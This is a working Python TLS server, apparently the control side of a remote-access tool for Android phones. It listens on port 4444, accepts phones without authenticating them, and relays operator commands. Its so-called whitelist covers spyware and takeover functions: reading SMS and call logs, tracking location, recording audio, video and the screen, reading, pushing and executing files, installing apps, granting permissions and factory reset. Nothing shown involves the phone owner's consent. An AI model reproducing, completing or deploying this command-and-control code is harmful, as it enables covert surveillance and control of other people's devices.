#!/usr/bin/env python3
"""
Secure Android Shell – TLS server
• Uses an explicit PROTOCOL_TLS_SERVER context (TLS 1.2 / 1.3)
• No client‑certificate requirement
• Thread‑pool handles multiple phone connections
"""

import socket
import ssl
import struct
import os
from concurrent.futures import ThreadPoolExecutor

# ────────────────────────────────────────────────────────────────
# Server configuration
# ────────────────────────────────────────────────────────────────
SERVER_IP   = '0.0.0.0'
SERVER_PORT = 4444
CERT_FILE   = '/home/bmac60714/server.crt'   # adjust paths
KEY_FILE    = '/home/bmac60714/server.key'

# ────────────────────────────────────────────────────────────────
# Build a dedicated TLS‑server context
# ────────────────────────────────────────────────────────────────
def create_ssl_context() -> ssl.SSLContext:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)      # ← guarantees server role
    ctx.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)

    # optional hardening
    ctx.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1  # disable old versions
    ctx.set_ciphers("ECDHE+AESGCM")                     # modern AEAD ciphers
    ctx.verify_mode = ssl.CERT_NONE                     # no client certificate
    ctx.check_hostname = False

    return ctx

# ────────────────────────────────────────────────────────────────
# Whitelisted command list (unchanged)
# ────────────────────────────────────────────────────────────────
ALLOWED_COMMANDS = {
    "battery_status":  "Query battery level/state",
    "storage_status":  "Query disk usage/state",
    "device_info":     "Query general device info",
    "system_info":     "Query system info",
    "os_version":      "Query OS version",
    "cpu_info":        "Get CPU info",
    "ram_info":        "Get RAM usage info",
    "wifi_status":     "Get Wi‑Fi status",
    "cellular_status": "Get cellular status",
    "bluetooth_status":"Check Bluetooth status",
    "fetch_logs":      "Retrieve logs",
    "process_list":    "List running processes",
    "crash_report":    "Retrieve last crash report",
    "camera_status":   "Check camera hardware state",
    "sensor_status":   "Check sensor states",
    "mic_status":      "Check microphone state",
    "call_logs":       "Retrieve call logs",
    "sms_logs":        "Retrieve SMS logs",
    "installed_apps":  "List installed apps",
    "gps_status":      "Get GPS status",
    "location_info":   "Retrieve last known location",
    "list_directory":  "List directory contents",
    "read_file":       "Read a file",
    "delete_file":     "Delete a file",
    "rename_file":     "Rename / move a file",
    "copy_file":       "Copy a file",
    "mkdir":           "Create directory",
    "rmdir":           "Remove directory",
    "push_file":       "Push file to device",
    "exec_file":       "Execute file on device",
    "reboot_device":   "Reboot the device",
    "shutdown_device": "Shut down the device",
    "factory_reset":   "Factory reset",
    "kill_process":    "Kill process",
    "start_service":   "Start background service",
    "stop_service":    "Stop background service",
    "install_app":     "Install APK",
    "uninstall_app":   "Uninstall APK",
    "list_system_permissions": "List system permissions",
    "get_permission_status":   "Get permission status",
    "grant_permission":        "Grant permission",
    "revoke_permission":       "Revoke permission",
    "capture_screenshot":      "Take screenshot",
    "record_screen":           "Record screen",
    "record_audio":            "Record audio",
    "record_video":            "Record video",
}

def handle_command(cmd: str, sock: socket.socket) -> bool:
    """
    Validate & forward a command to the client.
    Returns True if authorised, False otherwise.
    """
    if cmd not in ALLOWED_COMMANDS:
        sock.sendall(f"UNAUTHORIZED: {cmd}\n".encode())
        return False
    sock.sendall(f"{cmd}\n".encode())
    return True

# ────────────────────────────────────────────────────────────────
# Per‑client handler (runs in thread‑pool)
# ────────────────────────────────────────────────────────────────
def client_handler(sock: socket.socket, addr):
    print(f"[+] TLS client {addr} connected")
    try:
        while True:
            cmd = input("Enter command (type 'exit' to disconnect): ").strip()
            if cmd.lower() == "exit":
                break
            if not handle_command(cmd, sock):
                print("[!] Unauthorized command.")
                continue

            # — read 4‑byte length prefix —
            prefix = sock.recv(4)
            if len(prefix) < 4:
                print("[!] Client closed connection.")
                break
            length = struct.unpack('!I', prefix)[0]

            # — read payload —
            data, received = [], 0
            while received < length:
                chunk = sock.recv(min(4096, length - received))
                if not chunk:
                    break
                data.append(chunk)
                received += len(chunk)

            print(f"[{addr} reply] {b''.join(data).decode()}")
    except Exception as e:
        print(f"[!] Handler error {addr}: {e}")
    finally:
        sock.close()
        print(f"[-] {addr} disconnected")

# ────────────────────────────────────────────────────────────────
# Main loop
# ────────────────────────────────────────────────────────────────
def main():
    ctx = create_ssl_context()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as plain_sock:
        plain_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        plain_sock.bind((SERVER_IP, SERVER_PORT))
        plain_sock.listen(5)
        print(f"Secure Android Shell server listening on {SERVER_IP}:{SERVER_PORT}")

        # Wrap the *listening* socket → every accept() is already TLS
        with ctx.wrap_socket(plain_sock, server_side=True) as tls_listener:
            print("[*] Waiting for TLS clients …")
            with ThreadPoolExecutor(max_workers=5) as pool:
                while True:
                    try:
                        client, addr = tls_listener.accept()
                    except ssl.SSLError as e:
                        print(f"[!] TLS accept error: {e}")
                        continue
                    pool.submit(client_handler, client, addr)

# ────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    main()
